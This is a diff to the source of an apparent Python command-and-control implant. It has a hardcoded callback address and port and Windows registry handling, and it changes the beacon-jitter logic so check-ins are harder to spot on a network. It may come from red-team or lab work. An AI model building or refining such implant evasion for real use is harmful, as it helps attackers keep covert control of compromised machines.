@@ -7,10 +7,10 @@ from os import remove, path, getpid, kill, getlogin, name
 from datetime import datetime
 from sys import exit
 from signal import SIGTERM
-from random import randint, uniform
+from random import randint, uniform, choice
 
 if name  == "nt":
-    winreg_exists = importlib.find_loader('winreg')
+    winreg_exists = importlib.util.find_spec('winreg')
     if winreg_exists:
         import winreg
 
@@ -18,7 +18,7 @@ UUID = "67cf26b8-9942-11ea-a2db-bc14ef68ef25"   #python -c 'import uuid; print(u
 remote_ip = '192.168.119.149'
 remote_port = 443
 server_sni_hostname = ''
-VERBOSE = False
+VERBOSE = True
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = None
@@ -303,11 +303,20 @@ def query_beacon():
     except:
         BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
 
-def beacon_drift(value):
+def beacon_drift(value=30):
+    left_bound = 0
+    right_bound = 10
     if VERBOSE:
-        print_info("Beacon Setting is: {} seconds".format(value))
-    left_bound = abs(round(uniform(.95, 1) * value))
-    right_bound = abs(round(uniform(1, 1.05) * value))
+        print_info("Current Beacon Setting is: {} seconds".format(value))
+    try:
+        left_bound = round(uniform(.95, 1) * value)
+        right_bound = round(uniform(1, 1.05) * value)
+    except:
+        if VERBOSE:
+            print_warn("Unable to Calculate a good drift, defaulting to more predictable version")
+
+        left_bound = round(choice([.95,.97,.99, 1]) * value)
+        right_bound = round(choice([1,1.02,1.04, 1.05]) * value)
     new_interval = randint(left_bound, right_bound)
     if VERBOSE:
         print_info("New Beacon Value is: {} seconds".format(new_interval))
@@ -340,6 +349,8 @@ def main ():
                 print(e)
         finally:
             delete_keys()
+            if BEACON_INTERVAL_SETTING is None:
+                BEACON_INTERVAL_SETTING =  BEACON_INTERVAL_DEFAULT
             drift = beacon_drift(BEACON_INTERVAL_SETTING)
             if VERBOSE:
                 print_info("Sleeping for {}".format(drift))
